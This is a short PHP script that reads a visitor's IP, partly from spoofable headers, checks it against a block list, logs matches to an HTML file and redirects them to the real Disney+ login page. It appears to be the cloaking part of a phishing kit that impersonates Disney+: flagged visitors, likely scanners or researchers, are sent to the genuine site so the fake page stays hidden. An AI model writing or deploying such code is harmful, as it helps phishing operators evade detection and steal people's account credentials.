<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $IP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $IP = $_SERVER['REMOTE_ADDR'];
}
$link_file = "./functions/ip_forceur.txt";
$bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
$bannedip = array_map("str_getcsv", $bannedip);
$bannedip = array_column($bannedip, null, 0);
if(isset($bannedip[$IP])) {
    $line = date('Y-m-d H:i:s') . " - <b>{$bannedip[$IP][0]}</b> - {$bannedip[$IP][1]} - {$bannedip[$IP][2]}<br>\n";
    file_put_contents('recaled.html', $line . PHP_EOL, FILE_APPEND);
    header('Location: https://www.disneyplus.com/login');
    die(); 
}

?>